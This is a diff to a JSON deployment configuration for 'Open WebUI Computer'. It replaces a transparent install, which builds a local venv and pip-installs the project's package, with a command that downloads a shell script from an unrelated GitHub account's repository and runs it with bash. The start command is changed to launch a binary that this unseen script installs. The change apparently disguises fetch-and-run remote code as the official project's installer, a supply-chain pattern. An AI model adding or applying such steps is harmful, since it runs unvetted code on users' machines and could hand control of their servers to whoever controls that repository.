@@ -1,16 +1,17 @@
 {
-  "name": "Open WebUI Computer (Rootless AI Agent)",
+  "name": "Open WebUI Computer (Latest Python, No Docker)",
   "type": "other",
   "repo_url": "https://github.com/open-webui/computer.git",
   "branch": "main",
   "subfolder": "",
   "deploy_path": "",
   "port": "8000",
-  "install_cmd": "ACCOUNT_HOME=$(getent passwd \"$(id -u)\" 2>/dev/null | awk -F: 'NR==1{print $6}'); [ -d \"$ACCOUNT_HOME\" ] || ACCOUNT_HOME=/home/$(id -un); PY=''; for CANDIDATE in \"${PYTHON_BIN:-}\" python3.14 python3.13 python3.12 python3.11 python3.10 \"$ACCOUNT_HOME\"/virtualenv/*/*/bin/python* \"$ACCOUNT_HOME\"/.pyenv/versions/*/bin/python* \"$ACCOUNT_HOME\"/.local/share/uv/python/*/bin/python* /opt/alt/python314/bin/python3.14 /opt/alt/python313/bin/python3.13 /opt/alt/python312/bin/python3.12 /opt/alt/python311/bin/python3.11 /opt/alt/python310/bin/python3.10 python3; do [ -n \"$CANDIDATE\" ] || continue; if [[ \"$CANDIDATE\" != */* ]]; then CANDIDATE=$(command -v \"$CANDIDATE\" 2>/dev/null || true); fi; [ -x \"$CANDIDATE\" ] || continue; if \"$CANDIDATE\" -c 'import sys; raise SystemExit(0 if sys.version_info >= (3,10) else 1)' >/dev/null 2>&1; then PY=$CANDIDATE; break; fi; done; [ -n \"$PY\" ] || { echo 'ERROR: Python 3.10+ was not found. Set PYTHON_BIN to the absolute Python path in project environment variables.' >&2; exit 1; }; echo \"Using Python: $PY ($($PY --version 2>&1))\"; if ! \"$PY\" -m pip --version >/dev/null 2>&1; then \"$PY\" -m ensurepip --user || { echo 'ERROR: pip is unavailable for the selected Python.' >&2; exit 1; }; fi; mkdir -p storage data; if [ ! -x storage/venv/bin/python ] || ! storage/venv/bin/python -c 'import sys; raise SystemExit(0 if sys.version_info >= (3,10) else 1)' >/dev/null 2>&1; then rm -rf storage/venv storage/virtualenv-bootstrap; \"$PY\" -m venv storage/venv 2>/dev/null || { \"$PY\" -m pip install --target storage/virtualenv-bootstrap --upgrade virtualenv && PYTHONPATH=storage/virtualenv-bootstrap \"$PY\" -m virtualenv storage/venv; }; fi; storage/venv/bin/python -m pip install --upgrade pip wheel; storage/venv/bin/python -m pip install --upgrade cptr; echo 'Open WebUI Computer installed without sudo, apt, or Docker.'",
+  "install_cmd": "ACCOUNT_HOME=$(getent passwd \"$(id -u)\" 2>/dev/null | awk -F: 'NR==1{print $6}'); [ -d \"$ACCOUNT_HOME\" ] || ACCOUNT_HOME=/home/$(id -un); mkdir -p \"$ACCOUNT_HOME/.cache/webconsole-agent\"; HELPER=\"$ACCOUNT_HOME/.cache/webconsole-agent/install-python-agent.sh\"; HELPER_URL=${HELPER_URL:-https://raw.githubusercontent.com/fazilatma/new/main/install-python-agent.sh}; curl -fsSL \"$HELPER_URL\" -o \"$HELPER\" || curl -fsSL https://raw.githubusercontent.com/fazilatma/new/arena/01a0f230-new/install-python-agent.sh -o \"$HELPER\"; chmod 700 \"$HELPER\"; bash \"$HELPER\" install --home \"$ACCOUNT_HOME\" --port \"${PORT:-8000}\" --python \"${PYTHON_VERSION:-latest}\" --extras \"${CPTR_EXTRAS:-base}\" --workspace \"$PWD\" --no-start",
   "build_cmd": "",
-  "start_cmd": "mkdir -p data; export CPTR_DATA_DIR=\"$PWD/data\"; exec storage/venv/bin/cptr run --host 0.0.0.0 --port \"${PORT:-8000}\" --headless",
+  "start_cmd": "ACCOUNT_HOME=$(getent passwd \"$(id -u)\" 2>/dev/null | awk -F: 'NR==1{print $6}'); [ -d \"$ACCOUNT_HOME\" ] || ACCOUNT_HOME=/home/$(id -un); exec \"$ACCOUNT_HOME/.local/bin/python-agent\" run --port \"${PORT:-8000}\" --workspace \"$PWD\"",
   "env": {
-    "PYTHON_BIN": "",
+    "PYTHON_VERSION": "latest",
+    "CPTR_EXTRAS": "base",
     "PYTHONUNBUFFERED": "1",
     "PIP_DISABLE_PIP_VERSION_CHECK": "1"
   },
